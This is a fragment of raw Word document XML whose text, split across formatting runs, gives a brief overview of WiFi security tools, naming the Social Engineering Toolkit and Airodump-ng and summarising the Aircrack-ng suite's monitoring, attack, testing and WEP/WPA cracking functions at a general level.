    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="82"/>
        <w:ind w:left="524"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Soc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> E</w:t>
      </w:r>
      <w:r>
        <w:t>ng</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t>eer</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-4"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-17"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t>oo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="82"/>
        <w:ind w:left="524"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>rodu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:t>ng</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2" w:line="280" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="7697"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-5"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>crack-ng Su</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>te:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="6" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="287" w:lineRule="auto"/>
        <w:ind w:left="100" w:right="66" w:firstLine="710"/>
      </w:pPr>
      <w:r>
        <w:t>It</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="15"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>co</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="15"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>of</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>oo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="15"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>sess</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="12"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-11"/>
        </w:rPr>
        <w:t>W</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>Fi</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>ne</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>work</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="15"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>secur</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-16"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-42"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>It</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>focus</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="15"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:t>fe</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t>ent</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="15"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>ar</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>as of</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-4"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-11"/>
        </w:rPr>
        <w:t>W</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>Fi</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>secur</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>y:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="4" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="307" w:lineRule="auto"/>
        <w:ind w:left="808" w:right="375" w:hanging="284"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Mon</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>or</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>g</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Pack</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>cap</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t>e and expo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>of da</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">o </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>x</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>es for fur</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>her process</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ng by </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>rd par</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>oo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>s.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="exact"/>
        <w:ind w:left="524"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>tt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t>ck</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>R</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ay</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>tt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t>cks, deau</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>on,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>fake ac</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>s po</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>s and o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>hers v</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>packet</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="78"/>
        <w:ind w:left="770" w:right="7994"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>j</w:t>
      </w:r>
      <w:r>
        <w:t>ec</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>on.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="56"/>
        <w:ind w:left="524"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-17"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t>es</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>g</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Ch</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>ck</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-11"/>
        </w:rPr>
        <w:t>W</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>Fi</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>cards and dr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ver</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>capab</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>es (cap</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ure</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>j</w:t>
      </w:r>
      <w:r>
        <w:t>ec</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>on).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="82"/>
        <w:ind w:left="524"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Cr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-5"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>W</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>P</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-9"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>and</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-4"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>W</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-24"/>
        </w:rPr>
        <w:t>P</w:t>
      </w:r>
      <w:r>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-11"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>P</w:t>
      </w:r>
      <w:r>
        <w:t>SK (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>W</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-24"/>
        </w:rPr>
        <w:t>P</w:t>
      </w:r>
      <w:r>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-13"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>1 and 2).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
